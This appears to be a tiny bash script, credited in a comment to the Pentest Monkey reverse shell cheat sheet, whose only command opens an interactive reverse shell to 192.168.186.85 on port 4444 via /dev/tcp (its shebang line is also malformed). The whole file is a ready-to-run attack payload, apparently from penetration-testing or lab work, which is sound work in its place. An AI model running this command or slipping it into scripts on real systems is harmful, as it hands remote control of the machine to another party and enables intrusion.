#From Pentest Monkey https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
#!bin/bash
bash -i >& /dev/tcp/192.168.186.85/4444 0>&1